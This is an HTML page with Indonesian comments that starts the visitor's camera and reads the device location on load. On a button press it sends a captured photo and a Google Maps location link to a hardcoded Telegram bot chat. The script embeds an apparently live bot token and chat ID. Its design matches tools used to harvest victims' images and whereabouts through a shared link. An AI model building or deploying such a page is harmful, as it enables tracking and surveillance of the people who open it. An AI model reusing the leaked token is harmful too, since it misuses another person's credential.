<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Bot</title>
</head>
<body>
  <h1>Mengirim Lokasi dan Gambar ke Telegram</h1>
  <video id="camera" autoplay></video>
  <button id="send">Kirim ke Telegram</button>
  <script>
    const apiToken = "7537995896:AAGg4hCRAellVFqQHZml6qIZSBTEUs4WXQg"; // Ganti dengan token bot Anda
    const chatId = "7353825005"; // Ganti dengan chat ID Anda

    let currentLocation = null; // Untuk menyimpan lokasi perangkat

    // Tangkap kamera
    const startCamera = async () => {
      const video = document.getElementById("camera");
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
      } catch (err) {
        console.error("Gagal mengakses kamera:", err);
      }
    };

    // Dapatkan lokasi perangkat
    const getLocation = () => {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          return reject(new Error("Geolocation tidak didukung di browser ini."));
        }
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude } = position.coords;
            resolve({ latitude, longitude });
          },
          (error) => {
            reject(new Error("Gagal mendapatkan lokasi: " + error.message));
          }
        );
      });
    };

    // Kirim pesan dan foto ke Telegram
    const sendToTelegram = async (message, photoBlob) => {
      try {
        // Kirim pesan teks
        const messageUrl = `https://api.telegram.org/bot${apiToken}/sendMessage`;
        const messageResponse = await fetch(messageUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        });

        if (messageResponse.ok) {
          console.log("Pesan berhasil dikirim!");
        } else {
          console.error("Gagal mengirim pesan:", await messageResponse.text());
        }

        // Jika ada foto, kirim foto
        if (photoBlob) {
          const photoUrl = `https://api.telegram.org/bot${apiToken}/sendPhoto`;
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("photo", photoBlob, "capture.jpg");

          const photoResponse = await fetch(photoUrl, {
            method: "POST",
            body: formData,
          });

          if (photoResponse.ok) {
            console.log("Foto berhasil dikirim!");
          } else {
            console.error("Gagal mengirim foto:", await photoResponse.text());
          }
        }
      } catch (error) {
        console.error("Terjadi kesalahan:", error);
      }
    };

    // Ambil tangkapan layar dari video
    const capturePhoto = () => {
      const video = document.getElementById("camera");
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext("2d");
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      return new Promise((resolve) => {
        canvas.toBlob((blob) => {
          resolve(blob);
        }, "image/jpeg");
      });
    };

    // Event listener untuk tombol kirim
    document.getElementById("send").addEventListener("click", async () => {
      try {
        if (!currentLocation) {
          currentLocation = await getLocation(); // Ambil lokasi jika belum tersedia
        }
        const { latitude, longitude } = currentLocation;
        const locationMessage = `Lokasi saat ini: https://www.google.com/maps?q=${latitude},${longitude}`;

        const photoBlob = await capturePhoto();
        sendToTelegram(locationMessage, photoBlob);
      } catch (err) {
        console.error("Terjadi kesalahan:", err);
      }
    });

    // Mulai kamera dan ambil lokasi saat halaman dimuat
    (async () => {
      await startCamera();
      try {
        currentLocation = await getLocation();
        console.log("Lokasi perangkat berhasil didapatkan:", currentLocation);
      } catch (err) {
        console.error(err.message);
      }
    })();
  </script>
</body>
</html>
